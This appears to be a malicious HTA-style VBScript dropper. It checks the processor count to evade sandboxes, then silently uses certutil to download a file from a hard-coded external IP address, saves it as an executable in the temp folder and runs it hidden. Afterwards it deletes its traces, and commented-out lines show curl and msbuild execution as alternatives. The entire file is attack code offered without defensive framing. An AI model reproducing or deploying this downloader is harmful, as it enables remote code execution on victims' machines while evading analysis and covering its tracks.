<script language=vbscript>
  On Error Resume Next

  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objShell = CreateObject("WScript.Shell")
  objTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
  objWindir = objShell.ExpandEnvironmentStrings("%windir%")
  Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")

 
  Set colComputerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
  For Each objComputerSystem In colComputerSystem
    objProcessorCount = objComputerSystem.NumberofLogicalProcessors
  Next

  If objProcessorCount > 1 Then

    'objShell.Run "%COMSPEC% /c ping -n 60 127.0.0.1>nul", 0, 1
            
    ' Download file
    objShell.Run objWindir & "\system32\cmd.exe /c certutil -urlcache -split -f  http://15.222.66.186/r.txt %TEMP%\resource.exe && c:\Windows\System32\cmd.exe /c %TEMP%\resource.exe", 0
    'objShell.Run objWindir & "\system32\cmd.exe /c curl http://15.222.66.186/r.exe -o %TEMP%\resource.exe && C:\Windows\System32\cmd.exe /c %TEMP%\resource.exe", 0

    ' Execute resource(x).xml using msbuild.exe and nps
    objShell.Run objWindir & "\system32\cmd.exe /c del %TEMP%\resource.exe", 0
    'objShell.Run objWindir & "\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %TEMP%\resource" & x & ".xml", 0


    ' Cleanup
    For y = 1 To x
      Do While objFSO.FileExists(objTemp & "\resource" & y & ".xml")
        objShell.Run "%COMSPEC% /c ping -n 10 127.0.0.1>nul", 0, 1
        objFSO.DeleteFile(objTemp & "\resource" & y & ".xml")
      Loop
    Next      
  End If
  window.close()
</script>
